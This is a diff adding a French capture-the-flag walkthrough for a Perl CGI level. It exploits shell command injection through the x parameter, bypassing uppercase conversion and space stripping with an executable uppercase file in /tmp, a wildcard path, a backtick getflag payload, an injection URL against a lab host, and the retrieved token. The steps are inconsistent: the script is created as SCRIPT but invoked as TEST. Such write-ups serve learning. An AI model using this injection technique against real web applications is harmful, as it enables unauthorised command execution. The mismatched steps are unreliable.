@@ -1,0 +1,37 @@
+# En arrivant sur le home on voit un fichier perl d'un page web
+
+# En faisant cat sur le fichier on voit un fonction qui prend en argument une variable x et y passer en post request
+# depuis la page, c'est notre point d'entree
+
+# on voit aussi que l'argument x est le seul a etre evalue dans une commande shell (egrep), on vas donc s'en servir pour
+# injecter notre script
+
+# cependant des operations sont effectuer sur notre variable avant d'etre evaluer, il faut donc en prendre compte
+# le tr fais office de toupper et la deuxieme operation enleve les espaces
+
+# notre exploit vas devoir etre un fichier en Majuscule afin d'etre evaluer, de plus il devra avoir les droits en execution
+# car, a cause de la deletion des espaces, il nous est impossible de faire "sh fichier"
+# de plus il faut que la sortie apparaissent dans un dossier avec les droits en ecriture
+
+# Tout d'abord on cree notre dossier au seul endroit possible : /tmp et on lui donne des droits
+
+mkdir /tmp/AZUR
+chmod 777 /tmp/AZUR
+
+# Ensuite a l'interieur de ce dossier on cree un fichier qui match les conditions (en Majuscule):
+
+touch /tmp/AZUR/SCRIPT
+chmod 777 /tmp/AZUR/SCRIPT
+
+# A l'interieur on ecrit l'exploit suivant:
+
+`getflag > /tmp/AZUR/out`
+
+# Ensuite il nous reste plus qu'a appele notre script
+
+http://10.11.200.200:4646/level12.pl?x="`/*/AZUR/TEST`"
+
+#un fichier out est apparu
+
+cat out
+Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
